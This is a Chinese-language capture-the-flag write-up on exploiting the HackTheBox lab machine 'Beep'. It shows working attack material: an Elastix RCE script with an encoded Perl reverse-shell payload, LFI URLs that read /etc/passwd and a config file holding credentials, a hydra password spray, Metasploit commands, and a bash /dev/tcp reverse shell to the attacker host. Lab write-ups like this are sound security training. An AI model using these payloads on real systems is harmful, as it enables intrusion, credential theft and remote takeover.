> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/2eSLb_fGDmRyeKvdU6xWPA)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuC9klnn9cnRJcrEb2ZIAkmlbogCbTicqSWgBckcwZOEn3llMEy0MVa4zExO3LogerEWibEETUIIjzg/640?wx_fmt=png)

靶机信息
----

靶机地址:

```
 https://app.hackthebox.com/machines/Beep
```

靶场: HackTheBox.com

靶机名称: Beep

难度: 简单

提示信息:

```
 无
```

目标: user.txt 和 root.txt

实验环境
----

```
 攻击机:Kali 10.10.16.3
 
 靶机:10.10.10.7
```

信息收集
----

### 扫描端口

扫描靶机开放的服务端口

```
 sudo nmap -p- 10.10.10.7
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuC9klnn9cnRJcrEb2ZIAkm6GO5UYUQV9PP5792INWsvMO1MnFAJF3ushicWOJvJSic9PMXMSGp1YVw/640?wx_fmt=png)

```
 sudo nmap -sC -sV -p 22,25,80,110,111,143,443,3306,4190,4445,4559,5038,10000 10.10.10.7 -oN nmap.log
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuC9klnn9cnRJcrEb2ZIAkmgjVib10RPF3icI2Mll8Ok8HEcjYVo4zwjZAr7JAiczVtEuia1RanQJV8Ww/640?wx_fmt=png)

靶机开放多个端口 22(SSH),25、110、143(SMTP、POP3、IMAP),80、443、10000(HTTP/s),3306(MYSQL) 等，先来看看 80 端口。

### TCP:80(HTTP)

```
 http://10.10.10.7
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuC9klnn9cnRJcrEb2ZIAkmCHOv2ofQtlrmLtctpVh8mEQbRFsg7JOhvqsVHq6Bu9uwbldUexxs5Q/640?wx_fmt=png)

^___^：如果你访问时出现下面情况是因为新的浏览器不支持 TLS1.2 以下的加密协议，解决这个问题很简单，搜索引擎上有答案。

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuC9klnn9cnRJcrEb2ZIAkmYUqFb6ff1Eh8iaEA1R8pMpKAbPPSPIL1BT1uTdsDcgvvfb6sqzuwdDA/640?wx_fmt=png)

访问后直接跳转到 https 登录页面，页面正文发现程序名称为 Elastix，到搜索引擎上找找是否存在漏洞

漏洞利用 (Exploitation)
-------------------

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuC9klnn9cnRJcrEb2ZIAkmWAtAadnJ4Fc5nL6vdSXKiaTJstXNjzmaPNyWdY2vCBHwK7WdlOrgvUQ/640?wx_fmt=png)

搜索引擎提供了两个漏洞 LFI(本地文件包含) 和 RCE(远程代码执行) 漏洞，先来看看远程代码执行的 exp

### RCE 远程代码执行漏洞

```
 https://www.exploit-db.com/exploits/18650
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuC9klnn9cnRJcrEb2ZIAkmPmicNynKAcOpqr1iaQ1h60udqj1wjKAyRUYmcDXqO0iaZRicS3NibI6Fy1w/640?wx_fmt=png)

执行 exp 前需要做些准备

修改 exp 中的 IP 并保存为 RCEexp.py，并将 urllib.urlopen 修改为 urllib.request.urlopen

```
 import requests
 from requests_toolbelt import SSLAdapter
 requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = 'DEFAULT:@SECLEVEL=1'
 
 rhost="10.10.10.7"
 lhost="10.10.16.4"
 lport=443
 extension="223"
 
 req = requests.Session()
 adapter = SSLAdapter('TLSv1')
 req.mount('https://',adapter)
 # Reverse shell payload
 
 url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'
 req.get(url,verify=False)
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuC9klnn9cnRJcrEb2ZIAkm87yLibs3891uLvqUOJZRFpDKqsVbAUb3eKWZuyhLOv5FHiana30YQbQQ/640?wx_fmt=png)

这里的证书问题一直处理不好，再来看看 LFI 漏洞

```
https://www.exploit-db.com/exploits/37637
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuC9klnn9cnRJcrEb2ZIAkm0lhwDn2iczjKiaXKCoicBfOs3uTwsP7G2896SeV6AAyzXU9icyDDLMA1Ug/640?wx_fmt=png)

这里有段文件包含的 payload，直接拿来用

```
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuC9klnn9cnRJcrEb2ZIAkmLYnsCRC1fpflcZSBlafZppg15pmtoibexO5nHfOS5795P4fJibQdx7Cg/640?wx_fmt=png)

执行后在配置文件中发现 mysql 数据库和管理员用户名而且两个密码是相同的，其他用户密码会不会相同，再来看看有哪些用户

```
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuC9klnn9cnRJcrEb2ZIAkmLiaaI8tc4EKGPekX0LMMwKXPvfia3xt4MXLZHYYIoIuuVa8K7ElX3icKA/640?wx_fmt=png)

发现多个可以登录的账号，用刚获得的密码与账号匹配登录 SSH

### 密码喷洒

```
hydra -L user.txt -p jEhdIekWmdjE ssh://10.10.10.7
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuC9klnn9cnRJcrEb2ZIAkmBXMmUa8X9o99sMWSPiahyOkBd8ufzbOuj6JgCTkI7kAp12MLd8MiahQA/640?wx_fmt=png)

暴破失败，换 msf 试试 EXP

```
msfconsole -q
search Elastix
use 0
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuC9klnn9cnRJcrEb2ZIAkmQldRyII4t9yiaN4IrJe6tFvEfWxvrPK7WEtRL40FkK348A2miaibpt4Tg/640?wx_fmt=png)

找到 EXP，看看哪些选项需要配置

```
options
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuC9klnn9cnRJcrEb2ZIAkmzN1iawWxtkIkz2UzrMysKlazF1hUeVqFXbwQ46xY1JGcwcgGVrl23Tw/640?wx_fmt=png)

配置下选项并执行

```
set EXTENSION 0-500
set RHOSTS 10.10.10.7
set RPORT 443
set SSL true
set LHOST 10.10.16.5
run
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuC9klnn9cnRJcrEb2ZIAkmQibB2CJcPzWiciaoh7jEeD3kiaU0iaTZTKA7kY62iaN4WebgPr1MaDjme12Q/640?wx_fmt=png)

攻击失败还是 openssl 问题，再来看看 1000 端口

### TCP:10000(HTTP:Webmin)

```
https://10.10.10.7:10000/
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuC9klnn9cnRJcrEb2ZIAkm51bNZb0ibWSic8zrJ3tLF8micYrhGxQu3OdERHhZaDfvGIJLA4LCUiciazg/640?wx_fmt=png)

登录后发现是 Webmin，用之前的密码`jEhdIekWmdjE`和 root 账号试试能否登录

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuC9klnn9cnRJcrEb2ZIAkmqYHWxbsaEQHbYOlD99kap0QX4JtT6pgtdg23X3ARayz9lgSd0nibibOg/640?wx_fmt=png)

登录成功，太棒了，终于可以拿 shell 了，

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuC9klnn9cnRJcrEb2ZIAkmtHcvG8UGicKt763woudv1jEtfF5MIPoIpv6Ls0BosSjgxfXfXtExibug/640?wx_fmt=png)

攻击机监听 443 端口

```
sudo nc -lvvp 443
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuC9klnn9cnRJcrEb2ZIAkmza8IbOTh905EBXhbCNTUvQuj1M5V9gicECcLqnBdeTsahsTkUmXMwvg/640?wx_fmt=png)

执行反弹 payload

```
bash -c 'bash -i >& /dev/tcp/10.10.16.5/443 0>&1'
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuC9klnn9cnRJcrEb2ZIAkmPrz1sDOBM9Op99goTqlCUvgcScDBtVNBR7PPsLrPrgcC1plp0z560Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuC9klnn9cnRJcrEb2ZIAkmDicgIJrsQdxcBVEUBQuJTTjMN5Fo2eicZWEHjSoCLTiaqdy4bicgdU86TA/640?wx_fmt=png)

拿到 shell 并且是 root 权限，来找下 flag

```
cd /home
cat fanis/user.txt
cat /root/root.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuC9klnn9cnRJcrEb2ZIAkmUEPAJALLBDM2oyo3MXXYxAoumbwpmMToVUWytl4gOhaStRwffL35icw/640?wx_fmt=png)

拿到 flag，游戏结束

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuC9klnn9cnRJcrEb2ZIAkm3KZyKQkm9ElTQicXhRqpMTprHh2EwdIDEiccHu6qdfENDDia93P8hiahJw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuC9klnn9cnRJcrEb2ZIAkmhcfib1zwOnfnaAicTRVqkR45WNjbISibTLBqbUGhRHm2hXoWpOFnqvyVw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/7gUQD4TbLUuC9klnn9cnRJcrEb2ZIAkmn7XvxicSNyYZZ3RGtf5gvdOhMfenECIOOqeSRrLibPLhk6gghlX0nZibg/640?wx_fmt=jpeg)